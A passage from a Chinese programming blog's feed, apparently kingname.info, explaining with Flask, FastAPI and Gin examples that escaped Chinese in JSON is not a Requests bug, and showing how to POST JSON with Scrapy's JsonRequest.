Requests 自带的<code>json=</code>参数，参数值是一个字典。Requests 会自动把它转成 JSON 字符串。后两种方式，是我们手动提前把字典转成 JSON 字符串，然后使用<code>data=</code>参数发送给服务器。这两种方式需要在 Headers 里面指明<code>&#39;Content-Type&#39;: &#39;application/json&#39;</code>，服务器才知道发上来的是 JSON 字符串。</p><p>我们再来看看 Flask 写的后端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test_json', methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_json</span><span class="params">()</span>:</span></span><br><span class="line">    body = request.json </span><br><span class="line">    msg = <span class="string">f'收到 POST 数据，<span class="subst">&#123;body[<span class="string">"name"</span>]=&#125;</span>, <span class="subst">&#123;body[<span class="string">"age"</span>]=&#125;</span>'</span></span><br><span class="line">    print(msg)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'msg'</span>: msg&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-51-17.png" alt></p><p>可以看到，无论使用哪种 POST 方式，后端都能接收到正确的信息。</p><p>我们再来看 Fastapi 版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name: str</span><br><span class="line">    age: int </span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post('/test_json')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_json</span><span class="params">(body: Body)</span>:</span></span><br><span class="line">    msg = <span class="string">f'收到 POST 数据，<span class="subst">&#123;body.name=&#125;</span>, <span class="subst">&#123;body.age=&#125;</span>'</span></span><br><span class="line">    print(msg)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'msg'</span>: msg&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示，三种 POST 发送的数据，都能被后端正确识别：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-53-52.png" alt></p><p>我们再来看看 Gin 版本的后端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Body <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">    Age  <span class="keyword">int16</span>  <span class="string">`json:"age"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := gin.Default()</span><br><span class="line">    r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"running"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    r.POST(<span class="string">"/test_json"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        json := Body&#123;&#125;</span><br><span class="line">        c.BindJSON(&amp;json)</span><br><span class="line">        msg := fmt.Sprintf(<span class="string">"收到 POST 数据，name=%s, age=%d"</span>, json.Name, json.Age)</span><br><span class="line">        fmt.Println(<span class="string">"&gt;&gt;&gt;"</span>, msg)</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            <span class="string">"msg"</span>: fmt.Sprintf(<span class="string">"收到 POST 数据，name=%s, age=%d"</span>, json.Name, json.Age),</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    r.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下，三种请求方式的数据完全相同：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-56-23.png" alt></p><p>从这里可以知道，无论我们 POST 提交的 JSON 字符串中，中文是以 Unicode 码的形式存在还是直接以汉字的形式存在，后端服务都可以正确解析。</p><p>为什么我说中文在 JSON 字符串里面以哪种形式显示并不重要呢？这是因为，对 JSON 字符串来说，编程语言把它重新转换为对象的过程（叫做<code>反序列化</code>），本身就可以正确处理他们。我们来看下图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-16-05-25.png" alt></p><p><code>ensure_ascii</code>参数的作用，仅仅控制的是 JSON 的显示样式，当<code>ensure_ascii</code>为<code>True</code>的时候，确保 JSON 字符串里面只有 ASCII 字符，所以不在 ASCII 128个字符内的字符，都会被转换。而当<code>ensure_ascii</code>为<code>False</code>的时候，这些非 ASCII 字符依然以原样显示。这就像是一个人化妆和不化妆一样，本质并不会改变。现代化的编程语言在对他们进行反序列化的时候，两种形式都能正确识别。</p><p>所以，如果你是用现代化的 Web 框架来写后端，那么这两种 JSON 形式应该是没有任何区别的。Request 默认的<code>json=</code>参数，相当于<code>ensure_ascii=True</code>，任何现代化的 Web 框架都能正确识别 POST 提交上来的内容。</p><p>当然，如果你使用的是 C 语言、汇编或者其他语言来裸写后端接口，那确实可能有所差别。可智商正常的人，谁会这样做？</p><p>综上所述，这位同学遇到的问题，并不是 Requests 的 bug，而是他的后端接口本身有问题。可能那个后端使用了某种弱智 Web 框架，它接收到的被 POST 发上来的信息，没有经过反序列化，就是一段 JSON 字符串，而那个后端程序员使用正则表达式从 JSON 字符串里面提取数据，所以当发现 JSON 字符串里面没有中文的时候，就报错了。</p><p>除了这个 POST 发送 JSON 的问题，以前我有个下属，在使用 Scrapy 发送 POST 信息的时候，由于不会写POST 的代码，突发奇想，把 POST 发送的字段拼接到 URL 上，然后用 GET 方式请求，发现也能获取数据，类似于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br><span class="line">url = <span class="string">'http://www.xxx.com/api/yyy'</span></span><br><span class="line">requests.post(url, json=body).text</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">'http://www.xxx.com/api/yyy?name=青南&amp;age=20'</span>).text</span><br></pre></td></tr></table></figure><p>于是，这个同学得出一个结论，他认为这是一个普遍的规律，所有 POST 的请求都可以这样转到 GET 请求。</p><p>但显然，这个结论也是不正确的。这只能说明，这个网站的后端程序员，让这个接口能同时兼容两种提交数据的方式，这是需要后端程序员额外写代码来实现的。在默认情况下，GET 和 POST 是两种完全不同的请求方式，也不能这样转换。</p><p>如果这位同学会一些简单的后端，那么他立刻就可以写一个后端程序来验证自己的猜想。</p><p>再来一个例子，有一些网站，他们在 URL 中可能会包含另外一个 URL，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://kingname.info/get_info?url=https://abc.com/def/xyz?id=123&amp;db=admin</span><br></pre></td></tr></table></figure><p>如果你没有基本的后端知识，那么你可能看不出上面的网址有什么问题。但是如果你有一些基本的后端常识，那么你可能会问一个问题：网址中的<code>&amp;db=admin</code>，是属于<code>https://kingname.info/get_info</code>的一个参数，跟<code>url=</code>平级；还是属于<code>https://abc.com/def/xyz?id=123&amp;db=admin</code>的参数？你会疑惑，后端也会疑惑，所以这就是为什么我们这个时候需要 urlencode 的原因，毕竟下面两种写法，是完全不一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://kingname.info/get_info?url=https%3A%2F%2Fabc.com%2Fdef%2Fxyz%3Fid%3D123%26db%3Dadmin</span><br><span class="line"></span><br><span class="line">https://kingname.info/get_info?url=https%3A%2F%2Fabc.com%2Fdef%2Fxyz%3Fid%3D123&amp;db=admin</span><br></pre></td></tr></table></figure><p>最后，以我的爬虫书序言中的一句话来作为总结：</p><blockquote><p>爬虫是一门杂学，如果你只会爬虫，那么你是学不好爬虫的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在粉丝交流群里面，有个同学说他发现了&lt;code&gt;Requests&lt;/code&gt;的一个 bug，并修复了它：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-28-54.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;聊天记录中对应的图片为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-29-19.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;看到这个同学的截图，我大概知道他遇到了什么问题，以及为什么会误认为这是 Requests 的 bug。&lt;/p&gt;
    
    </summary>
    
      <category term="编程思想" scheme="https://www.kingname.info/categories/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
      <category term="编程思想" scheme="https://www.kingname.info/tags/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Scrapy 如何正确 Post 发送 JSON 数据</title>
    <link href="https://www.kingname.info/2021/05/20/use-scrapy-jsonrequest/"/>
    <id>https://www.kingname.info/2021/05/20/use-scrapy-jsonrequest/</id>
    <published>2021-05-20T13:08:20.000Z</published>
    <updated>2021-05-20T13:11:20.004Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，HTTP请求的 POST 方式，提交上去的数据有很多种格式。例如<code>JSON</code>/<code>form-data</code>/<code>x-www-form-urlencoded</code>等等。我们在 Postman 的 POST 请求里面，可以看到这些数据格式，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-31-18.png" alt></p><a id="more"></a><p>虽然同样都是 POST 方式，但是有些网站只能使用特定的格式才能正常返回数据。我们来看一个例子，现在向网址：<code>http://exercise.kingname.info/ajax_1_postbackend</code> POST 提交一个 JSON 字符串：<code>{“name”:”xx”,”age”:24}</code>可以正常得到返回：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-33-58.png" alt></p><p>但如果提交的数据格式不是 JSON，而是<code>form-data</code>，那么就会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-35-50.png" alt></p><p>这也就是为什么在使用 requests 的时候，post 方法的第二个参数有<code>data=</code>和<code>json=</code>的区别，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-37-58.png" alt></p><p>在使用 Scrapy 的时候，很多人都知道怎么提交 GET 请求，但却不太清楚怎么提交 POST 请求。如果你在网上搜索，那么，你会看到有两种回答：</p><p>第一种回答，会建议你使用<code>scrapy.FormRequest</code>。但这个方法提交的数据是<code>form-data</code>格式，如果网站需要接收 JSON 格式的数据，那么提交就会失败。</p><p>第二种回答，会建议你使用<code>scrapy.Request(url, method=&#39;POST&#39;, body=json.dumps(xxx))</code>。这种方式确实可以成功提交 JSON 数据，但写起来比较麻烦。</p><p>但如果你看过 Scrapy 的官方文档<a href="https://doc.scrapy.org/en/latest/topics/request-response.html#jsonrequest" target="_blank" rel="noopener">Requests and Responses</a>，你就会知道，实际上 Scrapy 原本就提供了一个专门用来POST 提交 JSON 数据的方式——<code>JsonRequest</code>。它的位置在<code>scrapy.http.JsonRequest</code>。并且使用起来跟 <code>scrapy.Request</code>一样简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import scrapy</span><br><span class="line">from scrapy.http import JsonRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ExampleSpider(scrapy.Spider):</span><br><span class="line">    name = &apos;example&apos;</span><br><span class="line">    allowed_domains = [&apos;xxx.com&apos;]</span><br><span class="line">    # start_urls = [&apos;http://xxx.com/&apos;]</span><br><span class="line"></span><br><span class="line">    def start_requests(self):</span><br><span class="line">        body = &#123;</span><br><span class="line">            &apos;name&apos;: &apos;kingname&apos;,</span><br><span class="line">            &apos;age&apos;: 28</span><br><span class="line">        &#125;</span><br><span class="line">        url = &apos;http://exercise.kingname.info/ajax_1_postbackend&apos;</span><br><span class="line">        yield JsonRequest(url, data=body, callback=self.parse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def parse(self, response, *args, **kwargs):</span><br><span class="line">        print(response.body.decode())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-48-43.png" alt></p><p><code>JsonRequest</code>本来就是<code>scrapy.Request</code>的一个子类，所以所有能在<code>scrapy.Request</code>使用的参数，都可以直接在<code>JsonRequest</code>中使用。同时，它额外支持两个参数，分别是<code>data</code>和<code>dumps_kwargs</code>。其中<code>data</code>参数的值就是一个可以被<code>json.dumps</code>序列化的对象，例如字典或者列表。而<code>dumps_kwargs</code>里面的参数，就是 <code>json.dumps</code>支持的那些参数，例如<code>ensure_ascii=False</code>、<code>sort_keys=True</code>等等。</p><p>大家遇到问题多看官方文档，少在网上搜索些杂七杂八装逼货的烂博客。官方文档是你最好的朋友。</p><hr><p><strong>未闻 Code</strong> 技术交流群开放啦！群里既有国内一二线大厂在职员工，也有国内外高校在读学生，既有十多年码龄的编程老鸟，也有中小学刚刚入门的新人，学习氛围良好！想入群的同学，请添加我的微信“mekingname”，备注“粉丝群”（谢绝广告党，非诚勿扰！）~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，HTTP请求的 POST 方式，提交上去的数据有很多种格式。例如&lt;code&gt;JSON&lt;/code&gt;/&lt;code&gt;form-data&lt;/code&gt;/&lt;code&gt;x-www-form-urlencoded&lt;/code&gt;等等。我们在 Postman 的 POST 请求里面，可以看到这些数据格式，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-05-20-20-31-18.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Scrapy" scheme="https://www.kingname.info/tags/Scrapy/"/>
    
  </entry>
  
</feed>
